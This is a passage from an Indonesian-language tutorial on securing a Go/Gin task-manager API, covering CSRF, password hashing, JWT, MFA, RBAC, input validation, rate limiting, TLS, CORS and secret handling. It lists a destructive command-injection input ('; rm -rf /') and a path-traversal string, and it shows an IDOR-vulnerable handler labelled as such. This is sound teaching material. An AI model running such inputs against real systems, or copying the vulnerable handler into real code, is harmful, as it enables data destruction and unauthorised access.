            c.SetCookie("csrf_token", token, 3600, "/", "", true, false)
            c.Set("csrf_token", token)
            c.Next()
            return
        }

        // Untuk POST, PUT, DELETE — validate CSRF token
        cookieToken, err := c.Cookie("csrf_token")
        if err != nil {
            response.Error(c, http.StatusForbidden, "CSRF token missing")
            c.Abort()
            return
        }

        headerToken := c.GetHeader("X-CSRF-Token")
        if headerToken == "" || headerToken != cookieToken {
            response.Error(c, http.StatusForbidden, "CSRF token invalid")
            c.Abort()
            return
        }

        c.Next()
    }
}
```

### SameSite Cookie Attribute

```go
// Modern browser support SameSite cookie attribute
// Ini mencegah cookie dikirim dari cross-origin requests

c.SetSameSite(http.SameSiteStrictMode) // Paling aman
c.SetCookie("session", token, 3600, "/", "example.com",
    true,  // Secure — hanya HTTPS
    true,  // HttpOnly — JavaScript ga bisa baca
)
```

**Prevention:**
- Pakai JWT di Authorization header (bukan cookie) untuk API
- Kalau pakai cookie: SameSite=Strict/Lax + CSRF token
- Double-submit cookie pattern
- Verify Origin/Referer header

---

## 20.6 Authentication Security — Deep Dive

### Password Hashing — Bcrypt vs Argon2

```go
// Task Manager kita sudah pakai bcrypt:
func (u *User) HashPassword() error {
    hashed, err := bcrypt.GenerateFromPassword(
        []byte(u.Password),
        bcrypt.DefaultCost, // Cost 10
    )
    if err != nil {
        return err
    }
    u.Password = string(hashed)
    return nil
}

// Bcrypt sudah bagus! Tapi Argon2id lebih modern:
import "golang.org/x/crypto/argon2"

type Argon2Params struct {
    Memory      uint32 // KB
    Iterations  uint32
    Parallelism uint8
    SaltLength  uint32
    KeyLength   uint32
}

var defaultParams = &Argon2Params{
    Memory:      64 * 1024, // 64MB
    Iterations:  3,
    Parallelism: 2,
    SaltLength:  16,
    KeyLength:   32,
}

func hashPasswordArgon2(password string) (string, error) {
    salt := make([]byte, defaultParams.SaltLength)
    _, err := rand.Read(salt)
    if err != nil {
        return "", err
    }

    hash := argon2.IDKey(
        []byte(password),
        salt,
        defaultParams.Iterations,
        defaultParams.Memory,
        defaultParams.Parallelism,
        defaultParams.KeyLength,
    )

    // Format: $argon2id$v=19$m=65536,t=3,p=2$<salt>$<hash>
    b64Salt := base64.RawStdEncoding.EncodeToString(salt)
    b64Hash := base64.RawStdEncoding.EncodeToString(hash)

    return fmt.Sprintf("$argon2id$v=%d$m=%d,t=%d,p=%d$%s$%s",
        argon2.Version,
        defaultParams.Memory,
        defaultParams.Iterations,
        defaultParams.Parallelism,
        b64Salt,
        b64Hash,
    ), nil
}
```

### Comparison: Bcrypt vs Argon2

```
Bcrypt:
+ Sudah proven, dipakai puluhan tahun
+ Simple API
+ Automatic salt
- Fixed memory usage
- GPU bisa dipakai untuk crack (walaupun lambat)

Argon2id:
+ Winner of Password Hashing Competition (2015)
+ Memory-hard (GPU/ASIC resistant)
+ Configurable memory, time, parallelism
+ Recommended oleh OWASP
- Lebih complex untuk setup
- Belum se-universal bcrypt

Rekomendasi:
- Bcrypt cost 12+ → Cukup untuk kebanyakan aplikasi
- Argon2id → Kalau mau next-level, atau handle data super sensitif
- JANGAN: MD5, SHA1, SHA256 tanpa salt
```

### Brute Force Protection

```go
// Sudah di-cover di middleware/ratelimit.go kita
// Tapi mari enhance:

// 1. Global rate limit per IP (sudah ada)
r.Use(middleware.RateLimiter(redisClient, 100, time.Minute))

// 2. Login-specific rate limit per email (perlu ditambah)
auth.POST("/login",
    middleware.LoginRateLimiter(redisClient, 5, 15*time.Minute),
    h.Auth.Login,
)

// 3. Progressive delay
// Attempt 1-3: no delay
// Attempt 4-5: 5 second delay
// Attempt 6+: account locked for 15 minutes
func ProgressiveDelay(attempt int) time.Duration {
    switch {
    case attempt <= 3:
        return 0
    case attempt <= 5:
        return 5 * time.Second
    default:
        return 15 * time.Minute
    }
}
```

### JWT Best Practices

```go
// Review implementasi JWT kita di service/auth.go:

// 1. Short expiry access token (15 minutes) ✅
ExpiresAt: jwt.NewNumericDate(time.Now().Add(15 * time.Minute))

// 2. Longer refresh token (7 days) ✅
ExpiresAt: jwt.NewNumericDate(time.Now().Add(7 * 24 * time.Hour))

// 3. Validate signing method ✅
if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
    return nil, errors.New("unexpected signing method")
}

// IMPROVEMENTS YANG BISA DITAMBAH:

// 4. Token blacklist (untuk logout / forced revoke)
func (s *AuthService) BlacklistToken(tokenString string) error {
    claims, err := s.ValidateToken(tokenString)
    if err != nil {
        return err
    }

    // Simpan token ID di Redis sampai expiry
    ttl := time.Until(claims.ExpiresAt.Time)
    key := fmt.Sprintf("blacklist:%s", tokenString)
    return s.redisClient.Set(context.Background(), key, "1", ttl).Err()
}

func (s *AuthService) IsBlacklisted(tokenString string) bool {
    key := fmt.Sprintf("blacklist:%s", tokenString)
    _, err := s.redisClient.Get(context.Background(), key).Result()
    return err == nil // exists = blacklisted
}

// 5. Refresh token rotation (generate pair baru setiap refresh)
// Ini sudah ada di kita — setiap RefreshToken() generate pair baru ✅

// 6. Issuer dan Audience claims
accessClaims := &JWTClaims{
    UserID: user.ID,
    Email:  user.Email,
    Role:   user.Role,
    RegisteredClaims: jwt.RegisteredClaims{
        ExpiresAt: jwt.NewNumericDate(time.Now().Add(15 * time.Minute)),
        IssuedAt:  jwt.NewNumericDate(time.Now()),
        Issuer:    "task-manager-api",      // Siapa yang bikin token
        Subject:   fmt.Sprintf("%d", user.ID),
        Audience:  jwt.ClaimStrings{"task-manager-web", "task-manager-mobile"},
    },
}
```

### MFA (Multi-Factor Authentication) Concept

```go
// MFA = Something you KNOW (password) + Something you HAVE (phone/authenticator)

// TOTP (Time-based One-Time Password) implementation concept
import "github.com/pquerna/otp/totp"

// 1. Generate secret untuk user (saat enable MFA)
func GenerateMFASecret(email string) (string, string, error) {
    key, err := totp.Generate(totp.GenerateOpts{
        Issuer:      "TaskManager",
        AccountName: email,
    })
    if err != nil {
        return "", "", err
    }

    // Return secret (simpan di DB) dan QR URL (untuk scan di Google Authenticator)
    return key.Secret(), key.URL(), nil
}

// 2. Validate TOTP code (saat login)
func ValidateMFACode(secret, code string) bool {
    return totp.Validate(code, secret)
}

// 3. Login flow dengan MFA:
// Step 1: User input email + password → validate → return "mfa_required" + temp token
// Step 2: User input TOTP code + temp token → validate → return access + refresh token
```

---

## 20.7 Authorization Security — RBAC & Beyond

### Review Task Manager RBAC

```go
// Task Manager punya 2 roles:
const (
    RoleAdmin  Role = "admin"   // Bisa akses semua
    RoleMember Role = "member"  // Cuma akses resource sendiri
)

// RoleMiddleware kita:
func RoleMiddleware(roles ...model.Role) gin.HandlerFunc {
    return func(c *gin.Context) {
        userRole, exists := c.Get("role")
        if !exists {
            response.Error(c, http.StatusUnauthorized, "User role not found")
            c.Abort()
            return
        }
        role := userRole.(model.Role)
        for _, r := range roles {
            if role == r {
                c.Next()
                return
            }
        }
        response.Error(c, http.StatusForbidden, "Insufficient permissions")
        c.Abort()
    }
}

// Dipakai di router:
admin.Use(middleware.RoleMiddleware(model.RoleAdmin))
```

### RBAC vs ABAC

```
RBAC (Role-Based Access Control):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Akses berdasarkan ROLE user.
- Admin → bisa semua
- Member → bisa CRUD resource sendiri
- Viewer → cuma bisa read

Simple, cocok untuk kebanyakan app.
Task Manager kita pakai ini.

ABAC (Attribute-Based Access Control):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Akses berdasarkan ATTRIBUTES (user, resource, environment).
- User department=engineering DAN resource.type=code DAN time=business_hours → allow
- User.level >= resource.sensitivity_level → allow

Lebih flexible, tapi lebih complex.
Cocok untuk enterprise app dengan access control yang granular.
```

### IDOR — Insecure Direct Object Reference (Common Mistake!)

```go
// VULNERABLE: GetByID tanpa ownership check
func (h *BoardHandler) GetByID(c *gin.Context) {
    id, _ := strconv.ParseUint(c.Param("id"), 10, 64)

    // MASALAH: User A bisa akses board User B!
    // Cukup ganti ID di URL: /api/v1/boards/999
    board, err := h.boardService.GetByID(uint(id))
    if err != nil {
        response.Error(c, http.StatusNotFound, err.Error())
        return
    }

    response.Success(c, http.StatusOK, "Board detail", board)
}

// SECURE: Cek ownership
func (h *BoardHandler) GetByID(c *gin.Context) {
    userID := c.GetUint("userID")
    userRole, _ := c.Get("role")
    id, _ := strconv.ParseUint(c.Param("id"), 10, 64)

    board, err := h.boardService.GetByID(uint(id))
    if err != nil {
        response.Error(c, http.StatusNotFound, "Board not found")
        return
    }

    // Cek: harus board owner atau admin
    if board.OwnerID != userID && userRole.(model.Role) != model.RoleAdmin {
        response.Error(c, http.StatusForbidden, "Access denied")
        return
    }

    response.Success(c, http.StatusOK, "Board detail", board)
}
```

> **Review Task Manager kita:** `handler/board.go` `GetByID` saat ini TIDAK cek ownership — siapa aja yang login bisa lihat board siapa aja. Ini adalah **IDOR vulnerability**. Perlu diperbaiki dengan menambahkan ownership check seperti contoh di atas.

### Least Privilege Principle

```
Rule of thumb:
- User hanya bisa akses APA YANG DIBUTUHKAN
- Jangan kasih akses lebih dari yang diperlukan
- Default = denied. Harus explicitly grant.

Contoh di Task Manager:
- Member bisa CRUD boards dan tasks MILIKNYA sendiri ← Correct
- Member bisa lihat semua boards ← SALAH (should be only their own)
- Admin bisa akses semua ← OK (tapi log semua admin actions)
```

---

## 20.8 Input Validation — Validate Everything

### Kenapa Input Validation Penting?

```
Semua attack dimulai dari INPUT:
- SQL Injection → malicious SQL di input
- XSS → malicious JavaScript di input
- Path Traversal → ../../etc/passwd di input
- Buffer Overflow → input yang terlalu panjang
- Command Injection → ; rm -rf / di input

Rule #1: NEVER TRUST USER INPUT
Rule #2: See Rule #1
```

### go-playground/validator (Yang Kita Pakai)

```go
// Gin menggunakan go-playground/validator secara default
// Kita sudah pakai di model DTOs:

type RegisterRequest struct {
    Name     string `json:"name" binding:"required,min=2,max=100"`
    Email    string `json:"email" binding:"required,email"`
    Password string `json:"password" binding:"required,min=6"`
}

type CreateTaskRequest struct {
    Title       string   `json:"title" binding:"required,min=1,max=200"`
    Description string   `json:"description"`
    Priority    Priority `json:"priority" binding:"omitempty,oneof=low medium high"`
    AssigneeID  *uint    `json:"assignee_id"`
    DueDate     *time.Time `json:"due_date"`
}
```

### Validator Tags yang Penting

```go
// String validation
type Input struct {
    Name     string `binding:"required,min=2,max=100"`          // Length
    Email    string `binding:"required,email"`                   // Email format
    URL      string `binding:"required,url"`                     // URL format
    UUID     string `binding:"required,uuid"`                    // UUID format
    Alpha    string `binding:"alpha"`                            // Hanya huruf
    AlphaNum string `binding:"alphanum"`                         // Huruf + angka
    IP       string `binding:"ip"`                               // IP address
}

// Number validation
type Pagination struct {
    Page  int `binding:"required,min=1"`                        // Min value
    Limit int `binding:"required,min=1,max=100"`                // Range
}

// Enum validation
type TaskInput struct {
    Status   string `binding:"oneof=todo in_progress done"`     // Enum values
    Priority string `binding:"oneof=low medium high"`
}

// Nested validation
type CreateBoardWithTasks struct {
    Title string              `binding:"required"`
    Tasks []CreateTaskRequest `binding:"required,dive"`          // Validate each element
}
```

### Custom Validator

```go
import "github.com/go-playground/validator/v10"

// Custom validator: no special characters in name
func noSpecialChars(fl validator.FieldLevel) bool {
    value := fl.Field().String()
    for _, char := range value {
        if !unicode.IsLetter(char) && !unicode.IsSpace(char) && char != '-' && char != '\'' {
            return false
        }
    }
    return true
}

// Custom validator: strong password
func strongPassword(fl validator.FieldLevel) bool {
    password := fl.Field().String()

    hasUpper := false
    hasLower := false
    hasNumber := false
    hasSpecial := false

    for _, char := range password {
        switch {
        case unicode.IsUpper(char):
            hasUpper = true
        case unicode.IsLower(char):
            hasLower = true
        case unicode.IsNumber(char):
            hasNumber = true
        case unicode.IsPunct(char) || unicode.IsSymbol(char):
            hasSpecial = true
        }
    }

    return hasUpper && hasLower && hasNumber && hasSpecial && len(password) >= 8
}

// Register custom validators
func setupValidators(r *gin.Engine) {
    if v, ok := binding.Validator.Engine().(*validator.Validate); ok {
        v.RegisterValidation("nospecialchars", noSpecialChars)
        v.RegisterValidation("strongpassword", strongPassword)
    }
}

// Usage:
type RegisterRequest struct {
    Name     string `json:"name" binding:"required,min=2,max=100,nospecialchars"`
    Email    string `json:"email" binding:"required,email"`
    Password string `json:"password" binding:"required,strongpassword"`
}
```

### Whitelist vs Blacklist

```
Blacklist (BAD):
- "Block karakter <, >, ', \""
- "Block kata DROP, DELETE, SELECT"
- Attacker selalu bisa bypass (encoding, unicode, double encoding)

Whitelist (GOOD):
- "Hanya izinkan huruf, angka, spasi, dan tanda hubung"
- "Hanya izinkan value: low, medium, high"
- "Hanya izinkan angka 1-100"
- Jauh lebih aman — everything not allowed = rejected
```

### Sanitize vs Reject

```
Sanitize = Bersihkan input, keep going
- html.EscapeString("<script>") → "&lt;script&gt;"
- Pro: User-friendly, input tetap diterima
- Con: Bisa unexpected behavior (data berubah)

Reject = Tolak input, return error
- "Input contains invalid characters"
- Pro: Lebih aman, data integrity terjaga
- Con: User harus fix input

Rekomendasi:
- Reject untuk: password, email, enum values
- Sanitize untuk: free-text fields (description, comments)
- Validate + sanitize = double protection
```

---

## 20.9 Rate Limiting & DDoS Protection

### Review Rate Limiter Kita

```go
// middleware/ratelimit.go — current implementation
func RateLimiter(redisClient *redis.Client, limit int, window time.Duration) gin.HandlerFunc {
    return func(c *gin.Context) {
        ctx := context.Background()
        ip := c.ClientIP()
        key := fmt.Sprintf("rate_limit:%s", ip)

        count, err := redisClient.Incr(ctx, key).Result()
        if err != nil {
            c.Next() // Redis down — allow request
            return
        }

        if count == 1 {
            redisClient.Expire(ctx, key, window)
        }

        if count > int64(limit) {
            response.Error(c, http.StatusTooManyRequests, "Rate limit exceeded. Try again later.")
            c.Abort()
            return
        }

        c.Next()
    }
}

// Dipakai di router:
r.Use(middleware.RateLimiter(redisClient, 100, time.Minute))
// 100 requests per minute per IP
```

### Improvement: Sliding Window Rate Limiter

```go
// Fixed window (current) punya masalah:
// 100 req di detik 59, 100 req di detik 61 = 200 req dalam 2 detik!
//
// Sliding window lebih accurate:

func SlidingWindowRateLimiter(redisClient *redis.Client, limit int, window time.Duration) gin.HandlerFunc {
    return func(c *gin.Context) {
        ctx := context.Background()
        ip := c.ClientIP()
        key := fmt.Sprintf("rate_limit_sw:%s", ip)
        now := time.Now().UnixNano()
        windowStart := now - int64(window)

        pipe := redisClient.Pipeline()

        // Remove old entries
        pipe.ZRemRangeByScore(ctx, key, "0", fmt.Sprintf("%d", windowStart))

        // Add current request
        pipe.ZAdd(ctx, key, redis.Z{Score: float64(now), Member: now})

        // Count requests in window
        countCmd := pipe.ZCard(ctx, key)

        // Set expiry on the key
        pipe.Expire(ctx, key, window)

        _, err := pipe.Exec(ctx)
        if err != nil {
            c.Next()
            return
        }

        count := countCmd.Val()

        // Set rate limit headers
        c.Header("X-RateLimit-Limit", fmt.Sprintf("%d", limit))
        c.Header("X-RateLimit-Remaining", fmt.Sprintf("%d", max(0, int64(limit)-count)))
        c.Header("X-RateLimit-Reset", fmt.Sprintf("%d", time.Now().Add(window).Unix()))

        if count > int64(limit) {
            c.Header("Retry-After", fmt.Sprintf("%d", int(window.Seconds())))
            response.Error(c, http.StatusTooManyRequests, "Rate limit exceeded")
            c.Abort()
            return
        }

        c.Next()
    }
}
```

### Rate Limiting per Endpoint

```go
// Beda endpoint, beda limit:
func setupRateLimits(r *gin.Engine, redis *redis.Client) {
    // Global: 100/minute
    r.Use(middleware.RateLimiter(redis, 100, time.Minute))

    // Auth routes: 10/minute (prevent brute force)
    authGroup := r.Group("/api/v1/auth")
    authGroup.Use(middleware.RateLimiter(redis, 10, time.Minute))

    // Register: 3/hour (prevent spam)
    authGroup.POST("/register",
        middleware.RateLimiter(redis, 3, time.Hour),
        h.Auth.Register,
    )

    // Password reset: 3/hour
    authGroup.POST("/forgot-password",
        middleware.RateLimiter(redis, 3, time.Hour),
        h.Auth.ForgotPassword,
    )
}
```

### Nginx Rate Limiting

```nginx
# /etc/nginx/nginx.conf

http {
    # Define rate limit zones
    limit_req_zone $binary_remote_addr zone=global:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=30r/s;

    # Limit connections per IP
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    server {
        listen 443 ssl;

        # Global rate limit
        limit_req zone=global burst=20 nodelay;
        limit_conn addr 10;  # Max 10 simultaneous connections per IP

        location /api/v1/auth/login {
            limit_req zone=login burst=3 nodelay;
            proxy_pass http://backend;
        }

        location /api/v1/ {
            limit_req zone=api burst=50 nodelay;
            proxy_pass http://backend;
        }

        # Return JSON for rate limit errors
        limit_req_status 429;
        error_page 429 = @rate_limited;

        location @rate_limited {
            default_type application/json;
            return 429 '{"status": 429, "message": "Rate limit exceeded. Try again later."}';
        }
    }
}
```

### DDoS Protection Layers

```
Layer 1: CDN / Edge (Cloudflare, AWS CloudFront)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Absorb volumetric attacks (terabits of traffic)
- Bot detection
- Geo-blocking
- JavaScript challenges
- DDoS auto-mitigation

Layer 2: Cloud Provider (AWS Shield, GCP Cloud Armor)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Network-level protection
- SYN flood mitigation
- AWS Shield Standard (free) / Advanced (paid)

Layer 3: Load Balancer / Nginx
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Connection limits
- Request rate limiting
- Request size limits
- Timeout configuration

Layer 4: Application (Go)
━━━━━━━━━━━━━━━━━━━━━━━━━
- Rate limiting per user/IP (Redis)
- Request size validation
- Timeout per request
- Circuit breaker
```

---

## 20.10 HTTPS & TLS — Encrypt Everything

### Kenapa HTTPS Everywhere?

```
HTTP (tanpa S):
Client ──────────────────── Server
         "password123"
   Siapa aja di network bisa baca!
   (ISP, WiFi pemilik, hacker di cafe)

HTTPS (dengan TLS):
Client ──────────────────── Server
         🔒 encrypted data
   Bahkan kalau intercept, ga bisa baca
```

### TLS Configuration di Nginx

```nginx
server {
    listen 443 ssl http2;
    server_name api.taskmanager.com;

    # TLS certificates (Let's Encrypt)
    ssl_certificate     /etc/letsencrypt/live/api.taskmanager.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/api.taskmanager.com/privkey.pem;

    # TLS 1.2+ only (disable TLS 1.0, 1.1)
    ssl_protocols TLSv1.2 TLSv1.3;

    # Strong cipher suites
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers on;

    # HSTS — Force HTTPS for 1 year
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;

    # SSL session caching
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets off;

    # DH params (generate: openssl dhparam -out dhparam.pem 2048)
    ssl_dhparam /etc/nginx/dhparam.pem;

    location / {
        proxy_pass http://localhost:8080;
    }
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name api.taskmanager.com;
    return 301 https://$server_name$request_uri;
}
```

### Let's Encrypt — Free TLS Certificates

```bash
# Install Certbot
sudo apt install certbot python3-certbot-nginx

# Generate certificate (auto-configure Nginx)
sudo certbot --nginx -d api.taskmanager.com

# Auto-renewal (cron job)
sudo certbot renew --dry-run

# Add to crontab
echo "0 0,12 * * * root certbot renew --quiet" | sudo tee /etc/cron.d/certbot-renew
```

### TLS di Go (Direct — Tanpa Nginx)

```go
// Kalau mau Go langsung serve HTTPS (tanpa reverse proxy):
func main() {
    r := gin.Default()

    // Setup routes...

    // Run dengan TLS
    err := r.RunTLS(":443",
        "/etc/letsencrypt/live/api.taskmanager.com/fullchain.pem",
        "/etc/letsencrypt/live/api.taskmanager.com/privkey.pem",
    )
    if err != nil {
        log.Fatal(err)
    }
}

// Atau custom TLS config:
import "crypto/tls"

tlsConfig := &tls.Config{
    MinVersion:               tls.VersionTLS12,
    PreferServerCipherSuites: true,
    CipherSuites: []uint16{
        tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
        tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
    },
}

server := &http.Server{
    Addr:      ":443",
    Handler:   r,
    TLSConfig: tlsConfig,
}

server.ListenAndServeTLS("cert.pem", "key.pem")
```

### Test SSL Configuration

```bash
# Test pakai SSL Labs (web):
# https://www.ssllabs.com/ssltest/

# Test pakai CLI:
# Install: go install github.com/drwetter/testssl.sh
curl -s https://api.taskmanager.com | head

# Check certificate details:
openssl s_client -connect api.taskmanager.com:443 -servername api.taskmanager.com

# Check TLS version:
openssl s_client -connect api.taskmanager.com:443 -tls1_2
openssl s_client -connect api.taskmanager.com:443 -tls1_3
```

---

## 20.11 CORS — Cross-Origin Resource Sharing

### Apa Itu CORS?

```
Browser enforce "Same-Origin Policy":
- JavaScript di app.example.com hanya bisa request ke app.example.com
- Request ke api.example.com = BLOCKED! (beda subdomain = beda origin)

CORS = mekanisme server bilang ke browser:
"Hey browser, request dari app.example.com itu OK, izinkan."

Origin = protocol + hostname + port
- http://example.com:3000 dan http://example.com:3001 = BEDA origin
- https://app.example.com dan https://api.example.com = BEDA origin
- https://example.com dan https://example.com = SAME origin
```

### Gin CORS Middleware

```go
import "github.com/gin-contrib/cors"

func setupCORS(r *gin.Engine) {
    // DEVELOPMENT — more permissive
    if os.Getenv("APP_ENV") == "development" {
        r.Use(cors.New(cors.Config{
            AllowOrigins:     []string{"http://localhost:3000", "http://localhost:5173"},
            AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
            AllowHeaders:     []string{"Authorization", "Content-Type", "X-CSRF-Token"},
            ExposeHeaders:    []string{"X-RateLimit-Limit", "X-RateLimit-Remaining"},
            AllowCredentials: true,
            MaxAge:           12 * time.Hour,
        }))
        return
    }

    // PRODUCTION — strict
    r.Use(cors.New(cors.Config{
        AllowOrigins:     []string{"https://app.taskmanager.com"},
        AllowMethods:     []string{"GET", "POST", "PUT", "DELETE"},
        AllowHeaders:     []string{"Authorization", "Content-Type"},
        ExposeHeaders:    []string{"X-RateLimit-Limit", "X-RateLimit-Remaining"},
        AllowCredentials: true,
        MaxAge:           12 * time.Hour,
    }))
}
```

### Common CORS Mistakes

```go
// BAHAYA: Allow all origins
r.Use(cors.New(cors.Config{
    AllowOrigins: []string{"*"},  // SEMUA website bisa akses API kamu!
    AllowCredentials: true,        // Ini + * = browser BLOCK (conflicting)
}))

// BAHAYA: Dynamic origin tanpa validation
r.Use(cors.New(cors.Config{
    AllowOriginFunc: func(origin string) bool {
        return true // Same as "*" — JANGAN!
    },
}))

// AMAN: Whitelist specific origins
allowedOrigins := map[string]bool{
    "https://app.taskmanager.com":   true,
    "https://admin.taskmanager.com": true,
}

r.Use(cors.New(cors.Config{
    AllowOriginFunc: func(origin string) bool {
        return allowedOrigins[origin]
    },
    AllowMethods:  []string{"GET", "POST", "PUT", "DELETE"},
    AllowHeaders:  []string{"Authorization", "Content-Type"},
    AllowCredentials: true,
}))
```

### Manual CORS Middleware (Tanpa Library)

```go
func CORSMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        origin := c.GetHeader("Origin")

        // Whitelist check
        allowed := map[string]bool{
            "https://app.taskmanager.com": true,
        }

        if allowed[origin] {
            c.Header("Access-Control-Allow-Origin", origin)
            c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
            c.Header("Access-Control-Allow-Headers", "Authorization, Content-Type")
            c.Header("Access-Control-Max-Age", "43200") // 12 hours
            c.Header("Access-Control-Allow-Credentials", "true")
        }

        // Handle preflight
        if c.Request.Method == "OPTIONS" {
            c.AbortWithStatus(http.StatusNoContent)
            return
        }

        c.Next()
    }
}
```

---

## 20.12 Secret Management — Jangan Hardcode Secrets!

### The Problem

```go
// JANGAN PERNAH lakukan ini:

// 1. Hardcoded di code
const jwtSecret = "mysupersecretkey123"           // ❌
const dbPassword = "postgres_password_2024"        // ❌
const apiKey = "sk_live_abc123xyz789"               // ❌

// 2. Committed ke git
// .env file yang ada di repository
// config.yaml dengan credentials
```

```
Real story:
- GitHub scan mendeteksi 3,000+ AWS keys SETIAP HARI yang accidentally committed
- Bot otomatis scan GitHub untuk leaked credentials
- Rata-rata 5 MENIT setelah commit, credential sudah dipakai attacker
```

### Level 1: Environment Variables + .env File

```bash
# .env (JANGAN commit ke git!)
APP_ENV=production
PORT=8080
JWT_SECRET=a7b9c3d5e2f8g4h1i6j0k7l9m2n5o8p1q4r0s3t6u9v2w5x8y1z4
DB_HOST=db.internal.example.com
DB_PORT=5432
DB_USER=task_manager_app
DB_PASSWORD=K8#mN2$pQ7@wR4vX9!aB3cD6eF0gH5j
DB_NAME=task_manager
REDIS_HOST=redis.internal.example.com
REDIS_PORT=6379
REDIS_PASSWORD=L9@nM3$qR8#wS5vY0!bC4dE7fG1hI6k
```

```bash
# .gitignore — WAJIB
.env
.env.*
!.env.example

# .env.example (ini yang di-commit — tanpa actual values)
APP_ENV=development
PORT=8080
JWT_SECRET=change-me-in-production
DB_HOST=localhost
DB_PORT=5432
DB_USER=postgres
DB_PASSWORD=
DB_NAME=task_manager
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=
```

```go
// config/config.go — review implementasi kita
func Load() *Config {
    return &Config{
        Env:       getEnv("APP_ENV", "development"),
        Port:      getEnv("PORT", "8080"),
        JWTSecret: getEnv("JWT_SECRET", "your-secret-key-change-in-production"),
        // ...
    }
}

// IMPROVEMENT: Validate required secrets at startup
func Load() *Config {
    cfg := &Config{
        Env:       getEnv("APP_ENV", "development"),
        Port:      getEnv("PORT", "8080"),
        JWTSecret: os.Getenv("JWT_SECRET"),
        // ...
    }

    // Jangan start kalau secret belum di-set
    if cfg.Env == "production" {
        if cfg.JWTSecret == "" || cfg.JWTSecret == "your-secret-key-change-in-production" {
            log.Fatal("JWT_SECRET must be set in production!")
        }
        if len(cfg.JWTSecret) < 32 {
            log.Fatal("JWT_SECRET must be at least 32 characters!")
        }
        if cfg.DB.Password == "" {
            log.Fatal("DB_PASSWORD must be set in production!")
        }
    }

    return cfg
}
```

### Level 2: Docker Secrets

```yaml
# docker-compose.yml
services:
  api:
    image: task-manager:latest
    secrets:
      - jwt_secret
      - db_password
    environment:
      JWT_SECRET_FILE: /run/secrets/jwt_secret
      DB_PASSWORD_FILE: /run/secrets/db_password

secrets:
  jwt_secret:
    file: ./secrets/jwt_secret.txt
  db_password:
    file: ./secrets/db_password.txt
```

```go
// Read from Docker secret file
func getSecretOrEnv(envKey, secretFile string) string {
    // Try secret file first
    if secretFile != "" {
        data, err := os.ReadFile(secretFile)
        if err == nil {
            return strings.TrimSpace(string(data))
        }
    }
    // Fallback to env
    return os.Getenv(envKey)
}

func Load() *Config {
    return &Config{
        JWTSecret: getSecretOrEnv("JWT_SECRET", os.Getenv("JWT_SECRET_FILE")),
        DB: DatabaseConfig{
            Password: getSecretOrEnv("DB_PASSWORD", os.Getenv("DB_PASSWORD_FILE")),
        },
    }
}
```

### Level 3: HashiCorp Vault / AWS Secrets Manager

```go
// AWS Secrets Manager
import "github.com/aws/aws-sdk-go-v2/service/secretsmanager"

func getSecretFromAWS(secretName string) (string, error) {
    cfg, err := awsconfig.LoadDefaultConfig(context.Background(),
        awsconfig.WithRegion("ap-southeast-1"),
    )
    if err != nil {
        return "", err
    }

    client := secretsmanager.NewFromConfig(cfg)

    result, err := client.GetSecretValue(context.Background(),
        &secretsmanager.GetSecretValueInput{
            SecretId: &secretName,
        },
    )
    if err != nil {
        return "", err
    }

    return *result.SecretString, nil
}

// Usage:
func LoadProductionConfig() *Config {
    secretJSON, _ := getSecretFromAWS("task-manager/production")

    var secrets struct {
        JWTSecret  string `json:"jwt_secret"`
        DBPassword string `json:"db_password"`
        RedisPass  string `json:"redis_password"`
    }
    json.Unmarshal([]byte(secretJSON), &secrets)

    return &Config{
        JWTSecret: secrets.JWTSecret,
        DB: DatabaseConfig{
            Password: secrets.DBPassword,
        },
        Redis: RedisConfig{
            Password: secrets.RedisPass,
        },
    }
}
```

### Level 4: Kubernetes Secrets

```yaml
# k8s/secret.yaml
apiVersion: v1
kind: Secret
metadata:
  name: task-manager-secrets
  namespace: production
type: Opaque
data:
  jwt-secret: YTdiOWMzZDVlMmY4ZzRoMWk2ajBrN2w5bTJuNW84cDE=  # base64 encoded
  db-password: SzgjbU4yJHBRN0B3UjR2WDkhYUIzY0Q2ZUYwZ0g1ag==
  redis-password: TDlAbk0zJHFSOCN3UzV2WTAhYkM0ZEU3Zkc=

---
# k8s/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: task-manager
spec:
  template:
    spec:
      containers:
        - name: api
          envFrom:
            - secretRef:
                name: task-manager-secrets
```

```bash
# Create secret via kubectl (lebih aman dari file YAML)
kubectl create secret generic task-manager-secrets \
  --from-literal=jwt-secret='a7b9c3d5e2f8g4h1i6j0k7l9m2n5o8p1' \
  --from-literal=db-password='K8#mN2$pQ7@wR4vX9!aB3cD6eF0gH5j' \
  --namespace=production

# JANGAN commit secret YAML ke git!
# Pakai sealed-secrets atau external-secrets operator
```

### 12-Factor App Config

```
12-Factor App Rule #3: Config
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"Store config in the environment"

Kenapa:
1. Config yang berubah per environment (dev/staging/prod) HARUS di environment variables
2. Code sama persis di semua environment — yang beda hanya config
3. Jangan simpan config di code atau config files yang di-commit

Config yang HARUS di environment:
- Database credentials
